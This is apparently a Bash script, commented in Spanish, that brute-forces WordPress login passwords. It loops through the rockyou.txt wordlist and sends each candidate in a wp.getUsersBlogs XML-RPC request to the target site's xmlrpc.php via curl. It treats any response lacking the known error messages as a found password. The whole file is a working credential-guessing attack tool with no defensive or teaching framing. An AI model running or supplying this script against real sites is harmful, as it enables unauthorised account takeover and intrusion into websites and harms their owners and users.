#!/bin/bash

#Script para hacer fuerza bruta a un Wordpress por Post mediante el metodo getUsersBlogs

function ctrl_c(){
  echo -e "[!] Saliendo ...."
  exit 1
}
#Control C
trap ctrl_c SIGINT

function createXML(){
  xmlFile="""
<?xml version="1.0" encoding="utf-8"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value>$user</value></param>
    <param><value>$password</value></param>
  </params>
</methodCall>
"""
  echo $xmlFile >file.xml 

  response=$(curl -s -X POST $3/xmlrpc.php -d@file.xml 2>/dev/null)
  #echo "\n\n$response \n"
  #sleep 5

  if [[ ! "$(echo $response | grep 'Incorrect username or password.')" && ! "$(echo $response | grep ' error. not well formed')"  && ! "$(echo $response | grep 'Insufficient arguments passed to this XML-RPC method.')" ]]; then  
   echo -e "La contraseña para el usuario  $2  es $1 "  
   exit 0
  
  fi 


}

if [[ $1 && $2 ]]; then 
  user=$2
  URL=$1
  cat /usr/share/wordlists/rockyou.txt | while read password; do 
  createXML "$password" "$user" "$URL"
  done  
else
  echo -e "\n[!] Uso : $0  < URL  user >"
  exit 1 
fi 


